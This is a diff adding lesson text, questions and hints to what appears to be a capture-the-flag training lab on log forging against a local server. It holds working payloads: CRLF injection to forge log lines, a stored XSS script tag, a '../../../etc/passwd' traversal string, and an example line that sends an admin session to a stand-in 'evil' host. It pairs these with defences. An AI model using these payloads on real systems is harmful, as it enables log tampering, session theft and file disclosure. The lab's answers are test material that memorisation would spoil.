@@ -4,18 +4,38 @@
   "tasks": {
     "1": {
       "title": "CRLF: injecting fake lines",
+      "body": "## One log line = a potential lie\n\nThe app logs your feedback like this:\n\n```python\nlog_line = f'[INFO] User alice said: {msg}'   # ← unsanitized msg\n```\n\nIf `msg` contains a line break, you control the start of the next\nline. The browser and curl send `%0d%0a` (CR+LF) and the server\nwrites it as is:\n\n```bash\ncurl 'http://127.0.0.1:18102/feedback?msg=hola%0d%0a[SUCCESS]%20Admin%20logged%20in'\n```\n\nThe log now contains:\n\n```\n[INFO] User alice said: hola\n[SUCCESS] Admin logged in            ← fake line, injected by you\n```\n\n## Why does it matter?\n\n- **Poisoned forensics**: after a real incident, the analyst rebuilds\n  the timeline from the logs. Fake lines = fake culprits and\n  misleading leads.\n- **Evasion**: \"success\" noise covers up the attacker's real activity.\n- **Broken parsers**: SIEMs that index line by line index your\n  content as events of their own.\n\nSend it and claim the flag, then look at the result:\n\n```bash\ncurl -s http://127.0.0.1:18102/logs\n```\n\n## The fix (one line)\n\n```python\nmsg = msg.replace('\\r', '').replace('\\n', '')   # or better: escape \\r\\n\n```\n\nSerious frameworks already do this: structlog and log4j (configured with\n`%replace`) provide converters that neutralize line breaks. The bug\nappears when someone concatenates raw input with `print()` or an\n`f-string` into the logger.",
       "questions": {
-        "log-forging-t01-q01": { "prompt": "Which two characters (URL-encoded as %0d%0a) mark the end of one log line and the start of another under your control?" },
-        "log-forging-t01-q02": { "prompt": "Inject a line that looks like a successful admin login ([SUCCESS] Admin logged in). Submit the LOG_FORGED achievement flag." },
-        "log-forging-t01-q03": { "prompt": "Inspect /logs with curl. Who appears as the author of ALL feedback lines (the default name the app writes)?" }
+        "log-forging-t01-q01": {
+          "prompt": "Which two characters (URL-encoded as %0d%0a) mark the end of one log line and the start of another under your control?",
+          "hint": "Carriage Return + Line Feed"
+        },
+        "log-forging-t01-q02": {
+          "prompt": "Inject a line that looks like a successful admin login ([SUCCESS] Admin logged in). Submit the LOG_FORGED achievement flag.",
+          "hint": "curl 'http://127.0.0.1:18102/feedback?msg=hola%0d%0a[SUCCESS]%20Admin%20logged%20in' — use single quotes so bash leaves the brackets alone"
+        },
+        "log-forging-t01-q03": {
+          "prompt": "Inspect /logs with curl. Who appears as the author of ALL feedback lines (the default name the app writes)?",
+          "hint": "curl -s http://127.0.0.1:18102/logs | head -5"
+        }
       }
     },
     "2": {
-      "title": "XSS in the log viewer and poisoning",
+      "title": "XSS in the log viewer and log poisoning",
+      "body": "## The XSS that detonates in the SOC\n\nCRLF was an attack on *reading* the logs. The next step is an\nattack on the *reader*: the admin viewer renders every line as\nunescaped HTML (`<pre>{{line}}</pre>` with innerHTML, not textContent).\n\nThe attacker doesn't need the victim to visit the vulnerable site —\nthey need **the analyst to open the log panel**:\n\n```bash\n# 1. Plant the script:\ncurl 'http://127.0.0.1:18102/feedback?msg=<script>alert(1)</script>'\n\n# 2. The admin reviews the day's logs in their browser:\n#    http://127.0.0.1:18102/logs  → alert(1) detonates in THEIR session\n```\n\nThe flag comes back in the feedback's JSON response; open the viewer in the\nbrowser too to see the real detonation. In production, that `alert(1)`\nwould be `fetch('//evil/'+document.admin_session)`: stored XSS in the\ntool you least suspect — the monitoring one.\n\n## Log poisoning with paths\n\nThe third technique targets pipelines that **process** logs as\npaths or file names:\n\n```bash\ncurl 'http://127.0.0.1:18102/feedback?msg=../../../etc/passwd'\n```\n\nIf any consumer of the log uses that line as a path (log rotation,\nuploads, template include), the `../` sequence breaks out of the directory\nsandbox. Real cases: log poisoning on FTP servers whose log line\nended up in a PHP `include()`, and SIEM pipelines that wrote\nfiles named after content taken from the log.\n\n## Defense in layers\n\n1. **Sanitize at the source**: no `\\r`, no `\\n`, and HTML-escape (`<` → `&lt;`)\n   before logging user input.\n2. **Safe rendering**: the viewer uses `textContent`, never `innerHTML`.\n3. **Restrictive CSP** on the admin panel:\n   `Content-Security-Policy: default-src 'self'` — even if the\n   tag gets injected, the browser does not run the inline script.\n4. **Separation**: the log viewer on a different domain/cookies than the admin\n   panel, so an XSS there is not the key to everything.",
       "questions": {
-        "log-forging-t02-q01": { "prompt": "Inject a <script> via feedback and open the /logs viewer in your browser. Submit the XSS_IN_LOG achievement flag." },
-        "log-forging-t02-q02": { "prompt": "Inject a ../ path pointing at /etc/ to simulate parser poisoning. Submit the LOG_POISONING achievement flag." },
-        "log-forging-t02-q03": { "prompt": "Which header's restrictive policy would stop the injected script from executing in the viewer? (the policy that blocks inline scripts)" }
+        "log-forging-t02-q01": {
+          "prompt": "Inject a <script> via feedback and open it in the /logs viewer in your browser. Submit the XSS_IN_LOG achievement flag.",
+          "hint": "curl 'http://127.0.0.1:18102/feedback?msg=<script>alert(1)</script>' and then open http://127.0.0.1:18102/logs — the flag also appears in the JSON response"
+        },
+        "log-forging-t02-q02": {
+          "prompt": "Inject a path with ../ pointing at /etc/ to simulate parser poisoning. Submit the LOG_POISONING achievement flag.",
+          "hint": "curl 'http://127.0.0.1:18102/feedback?msg=../../../etc/passwd'"
+        },
+        "log-forging-t02-q03": {
+          "prompt": "Which HTTP header (its acronym), with a restrictive policy, would stop the injected script from executing in the viewer? (the policy that blocks inline scripts)",
+          "hint": "A restrictive CSP with default-src 'self' and no 'unsafe-inline' stops the XSS even if the HTML gets injected"
+        }
       }
     }
   }
